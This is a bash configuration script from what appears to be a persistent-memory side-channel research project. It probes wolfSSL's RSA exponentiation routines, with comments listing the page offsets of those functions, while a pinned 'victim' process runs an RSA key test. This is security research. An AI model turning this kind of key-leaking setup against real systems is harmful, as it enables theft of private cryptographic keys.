# To be sourced

pageno=${pageno:-none}
offset=${offset:-none}

if [ "$pageno" == "none" ] || [ "$offset" == "none" ]; then
	echo "Variable not set: pageno [$pageno] offset [$offset]"
	exit 2
fi

side_channel_iter=$((1200 * 300))

function bench_run() {
	if [ ${side_channel_iter} -ne 0 ]; then
		# filefrag -v shows starting loc 33824, mod 256 gets 32
			# -c 32 \
		
		# 0000000000028e50 <fp_sqr>                page 40: offset 3664
		# 00000000000291f0 <fp_montgomery_reduce>  page 41: offset 496
		# 000000000002b3e0 <_fp_exptmod_base_2>    page 43: offset 992
		bench_run_side_channel \
			-i ${side_channel_iter} \
			-o probe_lib \
			-l /mnt/pmem/lib/libwolfssl.so.23.0.0 \
			-t $pageno \
			-r $offset \
			-e 0 \
		;
	fi
}

function prepare_victim() {
	echo "Prepare victim"
	export PARSE_SIDE_CHANNEL=n
	export LD_LIBRARY_PATH=/mnt/pmem/lib/:$LD_LIBRARY_PATH
	cp private.der ${TaskDir}
}

function bench_victim() {
	bench_echo "Bench dir: $PWD"
	bench_echo "Bench victim: START"
	nice -n -19 \
		numactl --physcpubind "8" \
		./wolf/test_rsa/rsa_keytest
	bench_echo "Bench victim: DONE"
}

function post_operations() {
	echo "Post operations: Parse results"
	pushd "${TaskDir}" || exit 2
	python3 ../../../nvleak/parse_shared_lib.py || true
	popd || exit 2
}
